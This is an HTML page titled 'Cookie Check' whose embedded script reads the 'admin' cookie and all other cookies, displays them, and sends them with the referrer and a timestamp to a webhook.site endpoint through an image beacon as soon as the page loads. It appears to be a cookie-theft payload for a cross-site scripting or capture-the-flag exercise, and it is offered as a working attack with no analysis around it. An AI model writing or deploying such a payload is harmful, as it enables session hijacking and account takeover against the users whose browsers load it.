<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Cookie Check</title>
</head>
<body>
  <h1>Cookie Information</h1>
  <div id="result"></div>

<script>
function getAdminCookie() {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [name, value] = cookie.trim().split('=');
    if (name === 'admin') {
      return decodeURIComponent(value);
    }
  }
  return null;
}

const adminValue = getAdminCookie();
const resultDiv = document.getElementById('result');

resultDiv.innerHTML = `
  <h2 style="color: green;">âœ… Admin Cookie Found!</h2>
  <p><strong>Value:</strong> ${adminValue}</p>
  <p><strong>All Cookies:</strong> ${document.cookie}</p>
`;

// Use Image Beacon - no CORS issues
const data = {
  admin: adminValue,
  allCookies: document.cookie,
  timestamp: new Date().toISOString(),
  referrer: document.referrer
};

const img = new Image();
img.src = 'https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86?' + 
          new URLSearchParams(data).toString();

console.log('Data sent via image beacon');
</script>
</body>
</html>
